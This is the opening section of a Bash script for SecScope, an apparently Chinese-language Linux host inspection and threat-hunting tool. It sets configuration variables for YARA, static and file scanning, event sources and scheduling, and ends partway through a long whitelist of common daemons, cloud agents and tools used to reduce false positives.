#!/usr/bin/env bash
#==============================================================================
# SecScope 持续安全巡检 v1.1
# 兼容: CentOS 7+ / Ubuntu 18+ / Debian 10+
# 要求: root 权限执行
# 用法: bash secscope.sh [--output DIR] [--init-state] [--install]
# 设计: 检查过程只读；状态、HTML 报告和原始证据仅写入专用目录
# 历史演进：跨轮基线、稳定实体、证据域门禁、静态/运行时分析与离线报告。
# 当前使用与验证信息见 README.md、docs/TEST-RESULTS.md 和 docs/SECURITY-AUDIT.md。
#==============================================================================
set -o pipefail
# 原始取证目录可能包含密码、Token 和进程环境变量。
umask 077
# root 执行时不继承调用者添加的相对目录或用户 bin 路径。
PATH="/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/sbin:/usr/local/bin"
export PATH

#==============================================================================
# 配置
#==============================================================================
readonly SCRIPT_VERSION="1.1-linux"
readonly DISPLAY_VERSION="1.1.0"
readonly SCRIPT_NAME="secscope.sh"
readonly PRODUCT_NAME="SecScope"
readonly PRODUCT_TAGLINE="Linux Host Inspection & Threat Hunting"
readonly RULE_VERSION="2026.08.14.110-rat"
readonly STATE_SCHEMA_VERSION="3"
readonly FILE_SCAN_CACHE_SCHEMA_VERSION="3"
readonly NATIVE_HASH_ANALYZER_VERSION="native-hash-files-v2"
readonly TIMESTAMP=$(date -u +%Y%m%d_%H%M%S)
readonly RUN_STARTED_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)
readonly RUN_STARTED_EPOCH=$(date +%s)
readonly RUN_ID="${TIMESTAMP}_$$"
readonly HOSTNAME=$(hostname 2>/dev/null || cat /proc/sys/kernel/hostname 2>/dev/null || echo "unknown")
readonly PROGRAM_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd -P)
OUTPUT_DIR="${OUTPUT_DIR:-}"
OUTPUT_DIR_EXPLICIT=false
STATE_DIR="${SECSCOPE_STATE_DIR:-/var/lib/secscope}"
REPORT_ROOT="${SECSCOPE_REPORT_ROOT:-${PROGRAM_DIR:-$PWD}/reports}"
LOCK_FILE="${SECSCOPE_LOCK_FILE:-/run/secscope.lock}"
PROFILE_LOCK_WAIT_SECONDS="${SECSCOPE_PROFILE_LOCK_WAIT_SECONDS:-300}"
RETENTION_DAYS="${SECSCOPE_RETENTION_DAYS:--1}"
HIGH_RETENTION_DAYS="${SECSCOPE_HIGH_RETENTION_DAYS:--1}"
RESOLVE_AFTER_MISSES="${SECSCOPE_RESOLVE_AFTER_MISSES:-3}"
WEBHOOK_URL="${SECSCOPE_WEBHOOK_URL:-}"
HOST_ROLE="${SECSCOPE_HOST_ROLE:-auto}"
RUN_MODE="${SECSCOPE_MODE:-Hunt}"
MODE_EXPLICIT=false
SCAN_PROFILE="${SECSCOPE_PROFILE:-daily-hunt}"
PROFILE_EXPLICIT=false
CORPUS_ROOT="${SECSCOPE_CORPUS_ROOT:-}"
CORPUS_MANIFEST_FILE="${SECSCOPE_CORPUS_MANIFEST:-}"
CORPUS_VALIDATION_STATUS="NOT_RUN"
CORPUS_MANIFEST_HELPER="${PROGRAM_DIR}/helpers/corpus_manifest.py"
NATIVE_SCANNER_MODE="${SECSCOPE_NATIVE_SCANNER:-on}"
NATIVE_SCANNER_PATH="${SECSCOPE_NATIVE_SCANNER_PATH:-${PROGRAM_DIR}/native/secscope-scanner/scanner}"
NATIVE_SCANNER_STATUS="NOT_RUN"
PROCESS_CONTROL_REQUEST=""
PROCESS_CONTROL_AUDIT_LOG=""
PROCESS_CONTROL_FINDINGS=""
NATIVE_HASH_FILES_READY=false
NATIVE_FILE_MONITOR_READY=false
NATIVE_RUNTIME_READY=false
NATIVE_RUNTIME_TIMEOUT="${SECSCOPE_NATIVE_RUNTIME_TIMEOUT:-120}"
NATIVE_RUNTIME_INITIAL_STATUS="NOT_RUN"
NATIVE_RUNTIME_PERIODIC_STATUS="NOT_RUN"
NATIVE_RUNTIME_FINAL_STATUS="NOT_RUN"
NATIVE_RUNTIME_LAST_STATUS="NOT_RUN"
NATIVE_RUNTIME_LAST_SUMMARY=""
PROFILE_STATIC_ANALYSIS=true
PROFILE_YARA_ENABLED=true
PROFILE_PACKAGE_INTEGRITY=false
PROFILE_DEEP_FILESYSTEM=false
AUTH_BEHAVIOR_ENABLED="${SECSCOPE_AUTH_BEHAVIOR_ENABLED:-true}"
AUTH_MAX_EVENTS="${SECSCOPE_AUTH_MAX_EVENTS:-200}"
EVENT_WINDOW_MINUTES="${SECSCOPE_EVENT_WINDOW_MINUTES:-40}"
FALCO_LOG_PATH="${SECSCOPE_FALCO_LOG:-}"
AUDIT_LOG_PATH="${SECSCOPE_AUDIT_LOG:-/var/log/audit/audit.log}"
YARA_RULES_PATH="${SECSCOPE_YARA_RULES:-${PROGRAM_DIR}/rules/yara-forge-core-20260809}"
YARA_MODE_REQUESTED="${SECSCOPE_YARA_MODE:-auto}"
YARA_MODE="auto"
YARA_FILE_TIMEOUT="${SECSCOPE_YARA_FILE_TIMEOUT:-8}"
YARA_TOTAL_TIMEOUT="${SECSCOPE_YARA_TOTAL_TIMEOUT:-120}"
YARA_MAX_FILES="${SECSCOPE_YARA_MAX_FILES:-600}"
YARA_MAX_RULE_SOURCES="${SECSCOPE_YARA_MAX_RULE_SOURCES:-64}"
YARA_RULE_MAX_DEPTH="${SECSCOPE_YARA_RULE_MAX_DEPTH:-3}"
YARA_PROMOTER_PATH="${PROGRAM_DIR}/helpers/yara_promoter.py"
STATIC_MAX_FILES="${SECSCOPE_STATIC_MAX_FILES:-1600}"
STATIC_ROOT_QUOTA="${SECSCOPE_STATIC_ROOT_QUOTA:-240}"
STATIC_ANALYZER_PATH="${PROGRAM_DIR}/helpers/static_analyzer.py"
BINARY_ANALYZER_PATH="${PROGRAM_DIR}/helpers/binary_analyzer.py"
STATIC_ROUTER_PATH="${PROGRAM_DIR}/helpers/route_static_candidates.py"
RAT_ENGINE_PATH="${PROGRAM_DIR}/helpers/rat_engine.py"
THREAT_INTEL_PATH="${PROGRAM_DIR}/helpers/threat_intel.py"
THREAT_INTEL_IOC_FILE="${SECSCOPE_THREAT_INTEL_IOC_FILE:-${PROGRAM_DIR}/rules/ioc-local.txt}"
THREAT_INTEL_ALLOW_FILE="${SECSCOPE_THREAT_INTEL_ALLOW_FILE:-${PROGRAM_DIR}/rules/ioc-allow.txt}"
MAINTENANCE_WINDOWS="${SECSCOPE_MAINTENANCE_WINDOWS:-}"
CONTEXT_ALLOW_FILE="${SECSCOPE_CONTEXT_ALLOW_FILE:-/etc/secscope/context.allow}"
SCHEDULE_MODE="${SECSCOPE_SCHEDULE_MODE:-interval}"
SCHEDULE_TIME="${SECSCOPE_SCHEDULE_TIME:-02:00}"
SCHEDULE_CRON="${SECSCOPE_SCHEDULE_CRON:-0 2 * * *}"
FAST_ENABLED="${SECSCOPE_FAST_ENABLED:-true}"
FAST_INTERVAL="${SECSCOPE_FAST_INTERVAL:-30min}"
DAILY_ENABLED="${SECSCOPE_DAILY_ENABLED:-true}"
DAILY_INTERVAL="${SECSCOPE_DAILY_INTERVAL:-2h}"
FULL_ENABLED="${SECSCOPE_FULL_ENABLED:-true}"
FULL_INTERVAL="${SECSCOPE_FULL_INTERVAL:-1d}"
FIRST_RUN_PROFILE="${SECSCOPE_FIRST_RUN_PROFILE:-none}"
FIRST_RUN_EXPLICIT=false
SCHEDULE_CONFIG_EXPLICIT=false
PROFILE_SCHEDULE_EXPLICIT=false
STATE_ENABLED=true
RECOVERY_NOTICE=""
INIT_STATE=false
RESET_STATE=false
SCHEDULED_RUN=false
EXECUTION_MODE="manual"
INCLUDE_SENSITIVE=false
SELF_TEST=false
CREATE_ARCHIVE=false
SHARE_PACKAGE=false
INSTALL_REQUEST=false
UNINSTALL_REQUEST=false
RAW_DIR=""
HTML_FILE=""
STATUS_FILE=""
ARCHIVE_FILE=""
STATE_FILE=""
EVENTS_FILE=""
STATE_COMMIT_PENDING=""
EVENTS_COMMIT_PENDING=""
LAST_STATUS_PENDING=""
AUTH_PROFILE_FILE=""
AUTH_SEEN_FILE=""
AUTH_PROFILE_HEALTH="UNINITIALIZED"
STATE_HEALTH="UNINITIALIZED"
CURRENT_MODULE="bootstrap"
CURRENT_MODULE_WARNINGS=""
RUN_FINISHED_AT=""
RUN_COVERAGE=0
MODULE_TOTAL=12
MODULE_COMPLETED=0
PANEL_ACTIVE=false
PANEL_FINISHED=false
PANEL_WIDTH=60
PANEL_INNER_WIDTH=56
PANEL_CURRENT_NAME="准备中"
PANEL_CURRENT_STATUS="WAITING"
PANEL_CURRENT_DETAIL="正在初始化检查"
PANEL_PHASE="RUNNING"
PANEL_STATE_FILE=""
PANEL_RENDER_PID=""
PANEL_UTF8=true
PANEL_SUMMARY_DRAWN=false
PANEL_STREAM_LINES=0
PANEL_SUMMARY_LIVE=true
INTERACTIVE_TTY_ACTIVE=false
INTERACTIVE_TTY_STATE=""
INTERACTIVE_MENU_RESULT=-1
LOCK_METHOD=""
HOST_ID=""
FILE_SCAN_CONFIG_FILE="${SECSCOPE_FILE_SCAN_CONFIG:-}"
FILE_MAX_FILES=3000
FILE_MAX_DEPTH=5
FILE_MAX_HASH_BYTES=104857600
FILE_TIMEOUT_SECONDS=120
FILE_RECENT_DAYS=7
FILE_SMALL_PRIORITY_BYTES=204800
FILE_SCAN_ROOTS="/tmp,/var/tmp,/dev/shm,/etc,/usr/local/bin,/usr/local/sbin,/opt,/srv/www,/var/www,/usr/share/nginx,/home,/root"
FILE_EXTENSIONS="sh,bash,zsh,py,pl,rb,php,phtml,jsp,jspx,asp,aspx,js,jpg,jpeg,png,gif,jar,war,so,ko,elf,bin,run,service,timer,socket,path,mount,conf"
FILE_EXCLUDE_NAMES="node_modules,.git,.svn,__pycache__,overlay2,containers,cache"
FILE_APPROVED_HASHES=""
FILE_MALICIOUS_HASHES=""
FILE_INVENTORY_FILE=""
FILE_INVENTORY_PENDING=""
FILE_SCAN_RULE_FINGERPRINT=""
FILE_SCAN_CACHE_KEY=""
FILE_INVENTORY_READY=false
FILE_SCAN_MODE="SNAPSHOT"
FILE_SCAN_STATUS="NOT_RUN"
FILE_SCAN_BASELINE=false
FILE_SCAN_SCANNED=0
FILE_SCAN_SKIPPED=0
FILE_SCAN_HASH_SUCCESS=0
FILE_SCAN_HASH_REUSED=0
FILE_SCAN_HASH_FAILED=0
FILE_SCAN_CHANGES=0
FILE_SCAN_SMALL_PRIORITY=0
FILE_SCAN_ADDED_SMALL=0
FILE_SCAN_SUSPICIOUS=0
FILE_SCAN_OBSERVE=0
FILE_SCAN_CONFIG_STATUS="DEFAULTS"
FILE_SCAN_CONFIG_WARNINGS=""
BENCHMARK_ENABLED="${SECSCOPE_BENCHMARK:-0}"
BENCHMARK_METRICS_FILE="${SECSCOPE_BENCHMARK_METRICS_FILE:-}"
BENCHMARK_STAGE_NAME=""
BENCHMARK_STAGE_STARTED_US=0
BENCHMARK_FILE_TRAVERSED=0
BENCHMARK_STAT_CALLS=0
BENCHMARK_PROC_PID_VISITS=0
BENCHMARK_PROC_MAPS_VISITS=0
BENCHMARK_SOCKET_SNAPSHOTS=0
BENCHMARK_FALLBACK_COUNT=0
FILE_PRIORITY_ADDED_SMALL=100
FILE_PRIORITY_MODIFIED=80
FILE_PRIORITY_RUNTIME_EXE=120
FILE_PRIORITY_RUNTIME_MAPPED=110
FILE_PRIORITY_WEB_ROOT=70
FILE_PRIORITY_TMP_EXECUTABLE=90
FILE_PRIORITY_PERSISTENCE_PATH=100
FILE_PRIORITY_RECENT=50
FILE_PRIORITY_SUSPICIOUS_EXTENSION=40
PATCH_STATUS="UNKNOWN"
PATCH_LATEST=""
PATCH_AGE_DAYS=-1
EVENT_CACHE_FILE=""
EVENT_CACHE_STATE_FILE=""
EVENT_SOURCE_FALCO="MISSING"
EVENT_SOURCE_AUDITD="MISSING"
EVENT_SOURCE_SNAPSHOT="AVAILABLE"
EVENT_SOURCE_YARA="MISSING"
YARA_SCANNER=""
YARA_SCANNER_PATH=""
YARA_SCANNER_VERSION=""
YARA_CAPABILITY_ERROR=""
YARA_SCANNED=0
YARA_MATCHED=0
YARA_TIMEOUT_COUNT=0
YARA_ERROR_COUNT=0
YARA_PROMOTED_FINDINGS=0
YARA_RULES_LOADED=0
STATIC_CANDIDATE_FILE=""
STATIC_WEB_CANDIDATE_FILE=""
STATIC_BINARY_CANDIDATE_FILE=""
STATIC_YARA_CANDIDATE_FILE=""
STATIC_COVERAGE_FILE=""
STATIC_CANDIDATE_STATUS=NOT_RUN
STATIC_PIPELINE_DEADLINE=0
STATIC_STAGE_TIMEOUT=0
SOCKET_SNAPSHOT_FILE=""
SOCKET_ESTABLISHED_FILE=""
FILE_CONTEXT_INDEX_READY=false
FILE_PERSISTENCE_REFERENCE_CACHE=""
PACKAGE_OWNER_CACHE_FILE=""
PACKAGE_OWNER_INDEX_READY=false
PACKAGE_VERIFY_CACHE_FILE=""
declare -A PACKAGE_OWNER_INDEX=()
declare -a FILE_PROCESS_PID_INDEX=()
declare -a FILE_PROCESS_DISPLAY_INDEX=()
declare -a FILE_NETWORK_PID_INDEX=()
SOCKET_LISTEN_FILE=""
SOCKET_LISTEN_TCP_FILE=""
SOCKET_LISTEN_UDP_FILE=""
SOCKET_SNAPSHOT_STATUS="NOT_RUN"
EVENT_SOURCE_IMA="MISSING"
EVENT_COUNT=0
EVENT_FALCO_COUNT=0
EVENT_AUDIT_COUNT=0
EVENT_WINDOW_START_EPOCH=0
WEB_ACCESS_LOG_STATUS="MISSING"
WEB_ACCESS_LOG_PATHS="${SECSCOPE_WEB_ACCESS_LOG_PATHS:-}"
WEB_ACCESS_LOG_MAX_LINES="${SECSCOPE_WEB_ACCESS_LOG_MAX_LINES:-5000}"
WEB_ACCESS_LOG_FORMAT="${SECSCOPE_WEB_ACCESS_LOG_FORMAT:-auto}"
WEB_ACCESS_LOG_FILES=0
WEB_ACCESS_LOG_LINES=0
WEB_ACCESS_LOG_PARSED=0
WEB_ACCESS_LOG_FAILED=0
CONTAINER_CONTEXT_STATUS="NOT_RUN"
KUBERNETES_CONTEXT_STATUS="NOT_RUN"
CONTAINER_CONTEXT_COUNT=0
KUBERNETES_CONTEXT_COUNT=0
KUBERNETES_ANOMALY_COUNT=0
MAINTENANCE_ACTIVE=false
SOURCE_AVAILABILITY_PERCENT=0
TELEMETRY_STATUS="DEGRADED"
TELEMETRY_EXPLANATION="尚未完成数据源评估"
PROCESS_BEHAVIOR_FILE=""
PROCESS_BEHAVIOR_HEALTH="UNINITIALIZED"
PROCESS_BEHAVIOR_MATURE=0
PROCESS_BEHAVIOR_OBSERVED=0
PROCESS_BEHAVIOR_PENDING=""
BEACON_HISTORY_FILE=""
BEACON_HISTORY_PENDING=""
BEACON_HISTORY_HEALTH="DISABLED"
BEACON_STATUS="DISABLED"
BEACON_OBSERVED=0
BEACON_CANDIDATES=0
CONNECTION_BASELINE_FILE=""
CONNECTION_BASELINE_PENDING=""
CONNECTION_BASELINE_READY=false
CONNECTION_BASELINE_HEALTH="UNINITIALIZED"
RAT_STATUS="DISABLED"
RAT_FINDING_COUNT=0
RAT_HIGH_COUNT=0
THREAT_INTEL_STATUS="THREAT_INTEL_UNAVAILABLE"
WEB_RUNTIME_BASELINE_FILE=""
WEB_RUNTIME_BASELINE_HEALTH="UNINITIALIZED"
WEB_RUNTIME_OBSERVED=0
WEB_RUNTIME_CHANGES=0
SUPPRESSION_AUDIT_FILE=""
SUPPRESSION_COUNT=0

# 全局存储 — 用于跨模块关联
OS_ID=""; OS_NAME=""; OS_VERSION=""; PKG_MGR=""; AUTH_LOG=""; SYSLOG=""; AUTH_EVENTS=""
declare -a FINDINGS=()
declare -a FINDING_SEVS=() FINDING_CATS=() FINDING_SUMMARIES=() FINDING_EVIDENCES=() FINDING_RECOMMENDATIONS=() FINDING_MITRES=()
declare -a FINDING_RULE_IDS=() FINDING_ENTITY_KEYS=() FINDING_FINGERPRINTS=() FINDING_EVIDENCE_HASHES=()
declare -a FINDING_ENTITY_TYPES=()
declare -a FINDING_EVIDENCE_PART_HASHES=()
declare -a YARA_RULE_SOURCES=()
declare -a DISCOVERED_WEB_ROOTS=()
declare -a FINDING_MODULES=() FINDING_LIFECYCLES=() FINDING_FIRST_SEEN=() FINDING_LAST_SEEN=() FINDING_OCCURRENCES=()
declare -a FINDING_RAW_REFS=()
declare -a FINDING_TYPES=() FINDING_CONFIDENCES=() FINDING_JUDGMENT_BASES=() FINDING_ESCALATION_CONDITIONS=()
declare -a FINDING_EVIDENCE_DOMAINS=() FINDING_DOMAIN_COUNTS=() FINDING_COUNTER_EVIDENCE=() FINDING_TIMELINES=()
declare -a IOCS=() IOC_TYPES=() IOC_VALUES=() IOC_CONTEXTS=()
declare -a TRUSTED_REMOTE_IPS=()
declare -a ALLOWED_PORT_RULES=()
declare -a LOCAL_ADDRESSES=()
declare -a ENDPOINT_NAMES=() ENDPOINT_STATUSES=() ENDPOINT_DETAILS=() ENDPOINT_SOURCES=()
declare -a PRIORITY_KEYS=() PRIORITY_ITEMS=() PRIORITY_STATUSES=() PRIORITY_RECOMMENDATIONS=()
declare -a MODULE_IDS=() MODULE_NAMES=() MODULE_STATUSES=() MODULE_DURATIONS=() MODULE_ERRORS=()
declare -a MODULE_PLANNED_SOURCES=() MODULE_SUCCESSFUL_SOURCES=() MODULE_NO_RESULT_SOURCES=()
declare -a MODULE_UNAVAILABLE_SOURCES=() MODULE_FAILED_SOURCES=() MODULE_MISSING_SOURCES=() MODULE_COVERAGES=()
declare -a RAW_PATHS=() RAW_STATUSES=() RAW_SOURCES=() RAW_ERRORS=()
declare -a COMPONENT_NAMES=() COMPONENT_VERSIONS=() COMPONENT_SOURCES=() COMPONENT_SUPPORT=()
declare -a FILE_BEHAVIOR_PATHS=() FILE_BEHAVIOR_ACTIONS=() FILE_BEHAVIOR_SEVS=() FILE_BEHAVIOR_CONFIDENCES=()
declare -a FILE_BEHAVIOR_MD5=() FILE_BEHAVIOR_SHA256=() FILE_BEHAVIOR_REASONS=() FILE_BEHAVIOR_CONTEXTS=()
declare -a FILE_BEHAVIOR_SIZES=() FILE_BEHAVIOR_PRIORITIES=()
declare -a FILE_BEHAVIOR_PRIORITY_SCORES=() FILE_BEHAVIOR_PRIORITY_REASONS=()
declare -a ABNORMAL_CONN_SEVS=() ABNORMAL_CONN_PIDS=() ABNORMAL_CONN_INSTANCES=() ABNORMAL_CONN_EXES=()
declare -a ABNORMAL_CONN_USERS=() ABNORMAL_CONN_CMDS=() ABNORMAL_CONN_TARGETS=() ABNORMAL_CONN_NEW=()
declare -a ABNORMAL_CONN_PACKAGES=() ABNORMAL_CONN_RAW=() ABNORMAL_CONN_PPIDS=() ABNORMAL_CONN_SERVICES=()
declare -a ATTACK_CHAIN_IDS=() ATTACK_CHAIN_TITLES=() ATTACK_CHAIN_DOMAINS=() ATTACK_CHAIN_TIMELINES=() ATTACK_CHAIN_EVIDENCES=()
declare -a CONTEXT_ALLOW_RULES=()
declare -a SUPPRESSION_RULE_IDS=() SUPPRESSION_ENTITIES=() SUPPRESSION_REASONS=() SUPPRESSION_COUNTS=()
declare -a SUPPRESSION_EVIDENCES=() SUPPRESSION_SOURCES=() SUPPRESSION_EXPIRES=() SUPPRESSION_OWNERS=()
declare -a RESOLVED_FPS=() RESOLVED_RULE_IDS=() RESOLVED_SEVS=() RESOLVED_CATS=() RESOLVED_SUMMARIES=() RESOLVED_FIRST_SEEN=() RESOLVED_LAST_SEEN=()
FINDING_ID=0
SEVERITY_CRITICAL=0
SEVERITY_HIGH=0
SEVERITY_MEDIUM=0
SEVERITY_LOW=0
SEVERITY_OBSERVE=0
THREAT_CRITICAL=0
THREAT_HIGH=0
THREAT_MEDIUM=0
THREAT_LOW=0
BASELINE_CRITICAL=0
BASELINE_HIGH=0
BASELINE_MEDIUM=0
BASELINE_LOW=0
ANOMALY_CRITICAL=0; ANOMALY_HIGH=0; ANOMALY_MEDIUM=0; ANOMALY_LOW=0; ANOMALY_OBSERVE=0
TRUST_CRITICAL=0; TRUST_HIGH=0; TRUST_MEDIUM=0; TRUST_LOW=0; TRUST_OBSERVE=0
OBSERVATION_CRITICAL=0; OBSERVATION_HIGH=0; OBSERVATION_MEDIUM=0; OBSERVATION_LOW=0; OBSERVATION_OBSERVE=0
LIFECYCLE_NEW=0
LIFECYCLE_CHANGED=0
LIFECYCLE_ESCALATED=0
LIFECYCLE_DEESCALATED=0
LIFECYCLE_REOPENED=0
LIFECYCLE_ONGOING=0
LIFECYCLE_BASELINE=0
LIFECYCLE_RESOLVED=0

# 颜色
if [ -z "${NO_COLOR+x}" ] && [ -t 1 ] && { [ "${FORCE_COLOR:-}" = "1" ] || [ -t 0 ]; }; then
    RED='\033[0;31m';    GREEN='\033[0;32m';    YELLOW='\033[0;33m'
    BLUE='\033[0;34m';   MAGENTA='\033[0;35m';  CYAN='\033[0;36m'
    BOLD='\033[1m';      DIM='\033[2m';         NC='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; BLUE=''; MAGENTA=''; CYAN=''; BOLD=''; DIM=''; NC=''
fi

# 误报白名单 — 综合网上 IR 脚本误报数据 + 主流云平台 Agent + 常见系统 daemon
# 原则: 白名单只降低低可信启发式噪音，不应覆盖明确的注入、持久化或网络证据
WHITELIST_PROCESS=(
    # ===== 代理/VPN (开发/翻墙常用) =====
    "clash" "clash-verge" "v2ray" "xray" "ss-local" "ssr-local" "trojan" "naive" "hysteria"
    "openvpn" "wireguard" "wg-quick" "strongswan" "libreswan"
    # ===== 抓包/扫描 (安全/网络工程师工具) =====
    "Charles" "Fiddler" "FiddlerEverywhere" "Wireshark" "tcpdump" "tshark" "dumpcap"
    "nmap" "masscan" "zmap" "zenmap" "bettercap" "ettercap"
    # ===== 远程桌面/协作 =====
    "ToDesk" "AweSun" "Sunlogin" "SunloginClient" "TeamViewer" "TeamViewer_Service"
    "AnyDesk" "RustDesk" "NoMachine" "vncserver" "Xvnc" "x11vnc" "XRDP"
    # ===== Android 模拟器 =====
    "BlueStacks" "MuMu" "MuMuPlayer" "Nox" "NoxVMHandle" "adb" "qemu-system"
    "LDPlayer" "MEmu" "GameLoop"
    # ===== 游戏/外设驱动 =====
    "Nahimic" "NahimicService" "Tobii" "Lenovo" "LenovoVantage" "Steam" "SteamService"
    "Discord" "Razer" "Logitech" "Corsair" "Riot" "EpicGames"
    # ===== 容器/K8s 运行时 =====
    "containerd" "containerd-shim" "dockerd" "docker-proxy" "docker-init"
    "kubelet" "kube-proxy" "kube-controller" "kube-scheduler" "kube-apiserver"
    "etcd" "cri-o" "conmon" "podman" "buildah" "skopeo" "runc" "crun"
    "iSulad" "lxcfs" "lxc-start" "lxd" "nerdctl"
    # ===== 开源监控/Observability =====
    "datadog" "datadog-agent" "zabbix" "zabbix_agentd" "zabbix_server"
    "prometheus" "node_exporter" "process-exporter" "blackbox_exporter"
    "filebeat" "fluentd" "fluent-bit" "td-agent" "telegraf" "collectd"
    "netdata" "grafana" "grafana-server" "grafana-agent" "newrelic" "newrelic-infra"
    "dynatrace" "dynatrace-oneagent" "SCOM" "osquery" "osqueryd"
    "auditbeat" "metricbeat" "heartbeat" "packetbeat" "elastic-agent"
    "checkmk" "icinga2" "nagios" "sensu" "sensu-agent"
    "signalfx" "signalfx-agent" "instana" "instana-agent"
    "jaeger" "opentelemetry" "otelcol" "vector" "alloy"
    "splunk" "splunkd" "splunkforwarder" "splunk-otel-collector"
    # ===== 阿里云安全/监控 Agent =====
    "AliYunDun" "AliYunDunUpdate" "AliYunDunMonitor" "aliyun-service" "aliyun_cloud"
    "alibabacloud" "AliSecGuard" "AliHids" "assist_daemon" "aliyun_installer"
    "aegis" "aegis_client" "aegis_update" "aegis_cli"
    # ===== 腾讯云安全/监控 Agent =====
    "YDService" "YDLive" "YDPython" "YDUtils" "YDQuaraV2" "YDEdr"
    "qtflame" "tcss-agent" "tcss-scan" "tcss" "sgagent"
    "barad_agent" "tat_agent" "tat_agentd" "tmanager" "tnginx"
    "yunjing" "YunJing" "YunDun" "qcloud" "qcloudagent"
    # ===== 华为云安全 Agent =====
    "hostguard" "hostwatch" "HSS" "hss_agent" "isap-agent"
    "cgs-agent" "cbs-agent" "ces-agent" "vss-agent"
    # ===== 百度云 / 京东云 / 金山云 / UCloud / 青云 / 七牛 =====
    "bce-agent" "bcc-agent" "bbc-agent"
    "jdcloud-agent" "jdcloud-monitor" "jdcloud-guard"
    "ksc-agent" "ksc-monitor" "kingsoft"
    "ucloud-agent" "ucloud-monitor" "uhost-guard"
    "qingcloud-agent" "qingcloud-monitor" "qc-agent"
    "qiniu-agent" "qiniu-monitor"
    # ===== 天翼云 / 浪潮 / 其他国产云 =====
    "KSecure" "inspur-agent" "ctyun-agent" "ctyun-monitor"
    "cmcc-agent" "unicom-agent"
    # ===== 常见运维 Agent/守护进程 =====
    "ospubcollector" "monitorpub" "lychee-agent" "umtr" "moopsagent" "opsagent"
    "scomadm" "scomuser" "salt-minion" "salt-master" "puppet" "puppet-agent"
    "ansible" "chef" "chef-client" "foreman"
    # ===== 数据库 =====
    "mysqld" "mariadbd" "postgres" "postmaster" "mongod" "mongos"
    "redis-server" "redis-sentinel" "etcd" "influxd" "influxdb"
    "elasticsearch" "tdsql" "polardb" "gaussdb" "oceanbase"
    "clickhouse-server" "cassandra" "couchdb" "neo4j" "arangod"
    "cockroach" "tidb" "tikv" "pd-server" "dm" "dm-worker"
    "sqlserver" "oracle" "db2" "memcached" "tarantool"
    # ===== Web/应用服务器 =====
    "nginx" "apache2" "httpd" "php-fpm" "php-cgi" "gunicorn" "uvicorn"
    "caddy" "tomcat" "java" "jetty" "wildfly" "jboss" "glassfish"
    "uwsgi" "traefik" "haproxy" "envoy" "kong" "apisix"
    "lighttpd" "litespeed" "openresty" "tengine" "resin"
    "weblogic" "websphere" "iis" "node" "nodemon" "pm2"
    # ===== 消息队列/中间件 =====
    "kafka" "zookeeper" "rabbitmq" "rabbitmq-server" "activemq" "rocketmq"
    "pulsar" "nats" "nats-server" "mosquitto" "emqx" "vernemq"
    "nacos" "consul" "consul-agent"
    # ===== 大数据/数据分析 =====
    "hadoop" "hdfs" "yarn" "spark" "flink" "hive" "hbase" "presto"
    "trino" "doris" "starrocks" "druid" "superset"
    "zookeeper" "zeppelin" "livy"
    # ===== 缓存/CDN =====
    "varnishd" "squid" "ats" "trafficserver" "cdn"
    # ===== 开发/编译工具 =====
    "gcc" "g++" "make" "cmake" "cargo" "rustc" "rust-analyzer"
    "node" "npm" "npx" "yarn" "pnpm" "bun" "deno"
    "pip" "pip3" "python" "python3" "python2" "ruby" "perl" "lua" "php"
    "git" "svn" "svnserve" "hg" "bzr" "gradle" "maven" "ant" "sbt"
    "go" "golang" "dlv" "gopls" "java" "javac" "jar"
    "gdb" "lldb" "strace" "ltrace" "valgrind" "perf"
    # ===== 系统核心 Daemon =====
    "systemd" "systemd-journald" "systemd-logind" "systemd-udevd"
    "systemd-resolved" "systemd-timesyncd" "systemd-networkd"
    "systemd-tmpfiles" "systemd-hostnamed" "systemd-localed"
    "systemd-timedated" "systemd-machined" "systemd-oomd"
    "systemd-userdbd" "systemd-homed" "init" "systemd-init"
    "dbus-daemon" "dbus-broker" "polkitd" "rtkit-daemon"
    "rsyslogd" "syslogd" "syslog-ng" "journald"
    "crond" "cron" "atd" "anacron" "dcron"
    "getty" "agetty" "login" "sshd" "telnetd"
    # ===== 硬件/电源管理 =====
    "acpid" "upowerd" "upower" "thermald" "tlp" "power-profiles-daemon"
    "irqbalance" "microcode" "kdump" "kexec" "mcelog" "rasdaemon"
    "smartd" "hdparm" "sdparm" "lm_sensors" "sensord"
    "cpufreq" "cpupower" "tuned" "tuned-adm"
    # ===== 网络基础服务 =====
    "NetworkManager" "networkd-dispatcher" "wpa_supplicant" "iwd"
    "dhclient" "dhcpcd" "dhcpd" "dnsmasq" "named" "bind"
    "ntpd" "chronyd" "ntpdate" "timesyncd" "openntpd"
    "snmpd" "snmptrapd" "lldpad" "lldpd"
    "rpcbind" "rpc.statd" "rpc.idmapd" "rpc.gssd" "rpc.svcgssd"
    "postfix" "sendmail" "exim" "dovecot" "courier"
    "vsftpd" "proftpd" "pure-ftpd" "sftp-server"
    "samba" "smbd" "nmbd" "winbindd" "nfsd" "mountd" "statd"
    "xinetd" "inetd" "tcpserver"
    # ===== 存储/文件系统 =====
    "autofs" "automount" "iscsid" "iscsi" "lvm" "lvmetad"
    "mdadm" "mdmonitor" "multipathd" "dm-multipath"
    "glusterfs" "glusterd" "ceph" "ceph-mon" "ceph-osd" "ceph-mds"
    "minio" "nfs-ganesha" "s3fs" "rclone"
    # ===== 虚拟化 =====
    "libvirtd" "virtqemud" "virtnetworkd" "virtstoraged" "virtsecretd"
    "qemu-kvm" "qemu-system" "qemu-guest-agent" "spice-vdagentd"
    "vmtoolsd" "VGAuthService" "open-vm-tools" "hv_kvp_daemon"
    "xen" "xenconsoled" "xenstored"
    # ===== 安全/审计 =====
    "auditd" "audisp" "firewalld" "iptables" "ip6tables" "nftables"
    "selinux" "setroubleshootd" "restorecond" "sssd" "sssd_kcm"
    "fail2ban" "fail2ban-server" "denyhosts" "psad" "fwknopd"
    "clamd" "freshclam" "crowdstrike" "falcon-sensor" "carbonblack"
    "symantec" "mcafee" "sophos" "trendmicro" "eset"
    "aide" "tripwire" "samhain" "integrit"
    # ===== 备份/同步 =====
    "rsync" "rsyncd" "syncthing" "restic" "borg" "borgmatic"
    "duplicity" "bacula" "bacula-fd" "bareos" "urbackup"
    "veeam" "veeamagent" "commvault" "netbackup" "tsm"
    # ===== 防御检测工具 =====
    "rkhunter" "chkrootkit" "lynis" "nessus" "nessusd" "openvas" "gvmd"
